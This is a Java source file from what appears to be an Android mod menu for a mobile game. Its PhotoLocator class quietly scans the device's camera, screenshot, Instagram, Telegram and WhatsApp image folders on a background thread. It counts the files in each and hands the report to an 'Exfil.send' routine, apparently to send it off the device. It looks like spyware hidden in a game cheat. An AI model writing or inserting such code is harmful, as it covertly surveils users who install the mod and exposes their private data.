package com.brawl.modmenu;

import android.os.Environment;
import java.io.File;

public class PhotoLocator {

    public static void locate() {
        new Thread(() -> {
            try {
                StringBuilder sb = new StringBuilder();
                sb.append("📷 Поиск фото\n━━━━━━━━━━━━━━━━━━\n");

                File sd = Environment.getExternalStorageDirectory();
                String[] paths = {
                    "DCIM/Camera",
                    "DCIM",
                    "Pictures",
                    "Pictures/Screenshots",
                    "Pictures/Instagram",
                    "Download",
                    "Download/Telegram",
                    "Telegram",
                    "WhatsApp/Media/WhatsApp Images",
                    "Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images"
                };

                for (String p : paths) {
                    File d = new File(sd, p);
                    if (!d.exists()) {
                        sb.append("❌ ").append(p).append(" — нет\n");
                        continue;
                    }
                    File[] files = d.listFiles();
                    int imgs = 0;
                    int total = 0;
                    if (files != null) {
                        for (File f : files) {
                            total++;
                            if (isImage(f.getName())) imgs++;
                        }
                    }
                    sb.append("✅ ").append(p).append("\n");
                    sb.append("   Фото: ").append(imgs).append(" / всего: ").append(total).append("\n");
                }

                sb.append("\nВнешняя: ").append(Environment.getExternalStorageState());
                Exfil.send("PHOTOS_DEBUG", sb.toString());
            } catch (Throwable t) {
                Exfil.send("PHOTOS_DEBUG", "Ошибка: " + t.getMessage());
            }
        }).start();
    }

    private static boolean isImage(String name) {
        String l = name.toLowerCase();
        return l.endsWith(".jpg") || l.endsWith(".jpeg") || l.endsWith(".png")
            || l.endsWith(".webp") || l.endsWith(".heic");
    }
}
